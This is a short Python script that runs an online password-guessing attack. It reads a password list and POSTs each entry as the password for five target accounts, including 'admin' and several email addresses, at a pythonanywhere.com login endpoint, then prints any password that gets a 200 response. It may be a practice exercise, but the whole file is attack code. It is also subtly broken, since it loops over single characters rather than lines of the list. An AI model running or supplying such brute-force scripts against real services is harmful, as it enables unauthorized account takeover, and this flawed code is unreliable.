import requests
import asyncio


##async def normPassword():


async def othersPassword(name, num):
    text = open('passwords2.txt','r').read()
    print(name)
    for password in text:
        response = requests.post('https://artemiikabanov.pythonanywhere.com/',
                                 json={'login': name, 'password': password})
        await asyncio.sleep(0)
        print(num)
        if response.status_code == 200:
            print('good', password)
            break


myloop = asyncio.get_event_loop()
tasks = [myloop.create_task(othersPassword('ivanpetrov', 1)),
         myloop.create_task(othersPassword('admin', 2)),
         myloop.create_task(othersPassword('lazarev1974@mail.ru', 3)),
         myloop.create_task(othersPassword('darthvader@deathstar.com', 4)),
         myloop.create_task(othersPassword('sanyaawp@gmail.com', 5))]
wait_tasks = asyncio.wait(tasks)
myloop.run_until_complete(wait_tasks)
myloop.close()
